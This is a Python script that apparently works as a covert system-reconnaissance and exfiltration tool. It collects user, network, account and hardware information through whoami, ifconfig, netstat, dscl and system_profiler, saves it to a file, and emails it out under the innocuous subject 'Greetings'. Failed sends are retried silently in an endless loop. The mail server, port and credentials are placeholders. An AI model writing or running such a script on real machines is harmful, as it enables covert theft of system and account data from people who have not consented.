import subprocess
import smtplib
import base64
import mimetypes
import email
import email.mime.application
import email.mime.multipart
import email.mime.text
import os

#os.chdir('/')

with open("stdout.txt",'ab') as out: subprocess.Popen("whoami", stdout=out),\
     subprocess.Popen("ifconfig", stdout=out),\
     subprocess.Popen("netstat", stdout=out), \
     subprocess.Popen("dscl", stdout=out), \
     subprocess.Popen("system_profiler", stdout=out), \
     subprocess.Popen("ls", stdout=out)

#had to modify commands for data collection:
        #even after os.chdir('/') and adjusting filename to include full path
        #cannot call dscl . list /Users with subprocess.Popen 
        #cannot recursively call ls with subprocess.Popen
        

msg = email.mime.multipart.MIMEMultipart()
msg['Subject'] = 'Greetings'
msg['From'] = 'sender@email'
msg['To'] = 'recipient@email'

body = email.mime.text.MIMEText("""Please see attachment for full system report.""")
msg.attach(body)

filename='stdout.txt'
fp=open(filename,'rb')
att = email.mime.application.MIMEApplication(fp.read())
fp.close()
att.add_header('Content-Disposition','attachment',filename=filename)
msg.attach(att)

while True: 
	try: 
		server = smtplib.SMTP('server', port)
		server.starttls()
		server.login('sender@email', 'password')
		server.sendmail('sender@email','recipient@email', msg.as_string())
		break
	except:
                #optional msg on exception
        	#print("Error: unable to send email.  Trying again")
		continue
